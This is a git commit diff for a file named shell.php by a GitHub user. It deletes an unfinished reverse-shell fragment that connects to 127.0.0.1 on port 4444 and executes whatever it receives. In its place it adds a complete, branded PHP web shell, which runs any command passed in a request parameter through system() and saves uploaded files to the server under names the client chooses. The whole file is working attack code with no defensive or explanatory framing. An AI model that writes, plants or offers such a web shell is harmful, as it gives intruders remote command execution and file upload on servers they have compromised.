9c34dccb9c205ad19a195c1b434c07f1b0e9d891
K0ur1i <101189469+00xk0uR1i@users.noreply.github.com>
2024-12-01 11:36:56 -0800

    Update shell.php

--- shell.php
+++ shell.php
@@ -1,14 +1,35 @@
 <?php
-    $sock = fsockopen("127.0.0.1", 4444, $errno, $errstr, 30);
-    if (!$sock) {
-        echo "$errstr ($errno)<br>";
-    } else {
-        $input = "";
-        while (!feof($sock)) {
-            $input .= fgets($sock, 2048);
-        }
-        fclose($sock);
-        echo "<pre>$input</pre>";
-        $output = `$input 2>&1`;
-        $response = "Output: " . $output . "\n";
-       
+// Simple PHP Web Shell
+
+if (isset($_REQUEST['cmd'])) {
+    echo "<pre>";
+    $cmd = ($_REQUEST['cmd']);
+    system($cmd);
+    echo "</pre>";
+    die;
+}
+
+if (isset($_FILES['file'])) {
+    move_uploaded_file($_FILES['file']['tmp_name'], $_FILES['file']['name']);
+    echo "Uploaded: " . $_FILES['file']['name'];
+    die;
+}
+
+?>
+<!DOCTYPE html>
+<html>
+<head>
+    <title>k0ur1i Shell</title>
+</head>
+<body>
+    <h1>Welcome to k0ur1i Shell</h1>
+    <form method="post">
+        <input type="text" name="cmd" placeholder="Enter command">
+        <button type="submit">Execute</button>
+    </form>
+    <form method="post" enctype="multipart/form-data">
+        <input type="file" name="file">
+        <button type="submit">Upload</button>
+    </form>
+</body>
+</html>
